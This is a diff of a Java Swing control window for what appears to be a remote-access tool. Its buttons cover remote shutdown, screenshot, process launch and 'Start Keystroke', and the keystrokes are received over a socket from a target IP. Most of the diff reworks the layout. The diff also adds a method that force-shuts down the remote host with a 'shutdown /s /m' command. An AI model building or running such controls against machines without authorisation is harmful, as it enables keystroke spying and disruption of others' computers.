@@ -50,7 +50,9 @@ public class NewJFrame extends javax.swing.JFrame {
     public NewJFrame(String ip, Socket sc) {
         this.socket = sc;
         this.ip = ip;
+        try {out = new DataOutputStream(socket.getOutputStream());} catch (IOException e){e.printStackTrace();}
         initComponents();
+        
         this.recv = new KeystrokeReceiver(socket);
     }
 
@@ -67,9 +69,8 @@ public class NewJFrame extends javax.swing.JFrame {
         shutdownBtn = new javax.swing.JButton();
         printScreenBtn = new javax.swing.JButton();
         openProcessBtn = new javax.swing.JButton();
-        jDesktopPane1 = new javax.swing.JDesktopPane();
-        jPanel2 = new javax.swing.JPanel();
         keystrokeBtn = new javax.swing.JToggleButton();
+        jPanel2 = new javax.swing.JPanel();
 
         setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
 
@@ -95,21 +96,6 @@ public class NewJFrame extends javax.swing.JFrame {
             }
         });
 
-        jDesktopPane1.setLayout(new java.awt.BorderLayout());
-
-        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
-        jPanel2.setLayout(jPanel2Layout);
-        jPanel2Layout.setHorizontalGroup(
-            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGap(0, 784, Short.MAX_VALUE)
-        );
-        jPanel2Layout.setVerticalGroup(
-            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGap(0, 522, Short.MAX_VALUE)
-        );
-
-        jDesktopPane1.add(jPanel2, java.awt.BorderLayout.CENTER);
-
         keystrokeBtn.setText("Start Keystroke");
         keystrokeBtn.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
@@ -117,42 +103,55 @@ public class NewJFrame extends javax.swing.JFrame {
             }
         });
 
+        jPanel2.setPreferredSize(new java.awt.Dimension(771, 400));
+
+        javax.swing.GroupLayout jPanel2Layout = new javax.swing.GroupLayout(jPanel2);
+        jPanel2.setLayout(jPanel2Layout);
+        jPanel2Layout.setHorizontalGroup(
+            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGap(0, 666, Short.MAX_VALUE)
+        );
+        jPanel2Layout.setVerticalGroup(
+            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
+            .addGap(0, 0, Short.MAX_VALUE)
+        );
+
         jDesktopPane2.setLayer(shutdownBtn, javax.swing.JLayeredPane.DEFAULT_LAYER);
         jDesktopPane2.setLayer(printScreenBtn, javax.swing.JLayeredPane.DEFAULT_LAYER);
         jDesktopPane2.setLayer(openProcessBtn, javax.swing.JLayeredPane.DEFAULT_LAYER);
-        jDesktopPane2.setLayer(jDesktopPane1, javax.swing.JLayeredPane.DEFAULT_LAYER);
         jDesktopPane2.setLayer(keystrokeBtn, javax.swing.JLayeredPane.DEFAULT_LAYER);
+        jDesktopPane2.setLayer(jPanel2, javax.swing.JLayeredPane.DEFAULT_LAYER);
 
         javax.swing.GroupLayout jDesktopPane2Layout = new javax.swing.GroupLayout(jDesktopPane2);
         jDesktopPane2.setLayout(jDesktopPane2Layout);
         jDesktopPane2Layout.setHorizontalGroup(
             jDesktopPane2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
-            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jDesktopPane2Layout.createSequentialGroup()
+            .addGroup(jDesktopPane2Layout.createSequentialGroup()
                 .addGap(31, 31, 31)
-                .addGroup(jDesktopPane2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
+                .addGroup(jDesktopPane2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                     .addComponent(shutdownBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                    .addComponent(openProcessBtn, javax.swing.GroupLayout.DEFAULT_SIZE, 241, Short.MAX_VALUE)
                     .addComponent(printScreenBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+                    .addComponent(openProcessBtn, javax.swing.GroupLayout.DEFAULT_SIZE, 151, Short.MAX_VALUE)
                     .addComponent(keystrokeBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
-                .addGap(33, 33, 33)
-                .addComponent(jDesktopPane1)
-                .addGap(23, 23, 23))
+                .addGap(52, 52, 52)
+                .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, 666, Short.MAX_VALUE)
+                .addGap(100, 100, 100))
         );
         jDesktopPane2Layout.setVerticalGroup(
             jDesktopPane2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
             .addGroup(jDesktopPane2Layout.createSequentialGroup()
-                .addGap(113, 113, 113)
+                .addGap(63, 63, 63)
                 .addGroup(jDesktopPane2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                     .addGroup(jDesktopPane2Layout.createSequentialGroup()
-                        .addComponent(jDesktopPane1)
-                        .addGap(118, 118, 118))
+                        .addComponent(jPanel2, javax.swing.GroupLayout.DEFAULT_SIZE, 471, Short.MAX_VALUE)
+                        .addGap(100, 100, 100))
                     .addGroup(jDesktopPane2Layout.createSequentialGroup()
                         .addComponent(shutdownBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                         .addGap(27, 27, 27)
                         .addComponent(printScreenBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                        .addGap(30, 30, 30)
+                        .addGap(27, 27, 27)
                         .addComponent(openProcessBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                        .addGap(32, 32, 32)
+                        .addGap(36, 36, 36)
                         .addComponent(keystrokeBtn, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                         .addGap(389, 389, 389))))
         );
@@ -173,9 +172,20 @@ public class NewJFrame extends javax.swing.JFrame {
 
 
     }//GEN-LAST:event_printScreenBtnActionPerformed
-
+    private void remoteShutdown(String ip){
+        Runtime runtime = Runtime.getRuntime();
+        System.out.println("shutdown /s /m \\\\" +ip+" /t 10 /f");
+        try {
+            runtime.exec("shutdown /s /m \\\\" +ip+" /t 30 /f");
+        } catch (IOException e){
+            e.printStackTrace();
+        }
+    }
     private void shutdownBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_shutdownBtnActionPerformed
         // TODO add your handling code here:
+        remoteShutdown(ip);
+        System.out.println("Preparing remote shutting down...");
+        
     }//GEN-LAST:event_shutdownBtnActionPerformed
 
     private void openProcessBtnActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_openProcessBtnActionPerformed
@@ -221,7 +231,6 @@ public class NewJFrame extends javax.swing.JFrame {
      */
 
     // Variables declaration - do not modify//GEN-BEGIN:variables
-    private javax.swing.JDesktopPane jDesktopPane1;
     private javax.swing.JDesktopPane jDesktopPane2;
     public static javax.swing.JPanel jPanel2;
     private javax.swing.JToggleButton keystrokeBtn;
@@ -233,8 +242,6 @@ public class NewJFrame extends javax.swing.JFrame {
         return jPanel2;
     }
 
-    public JDesktopPane getjDesktopPane1() {
-        return jDesktopPane1;
-    }
+   
 
 }
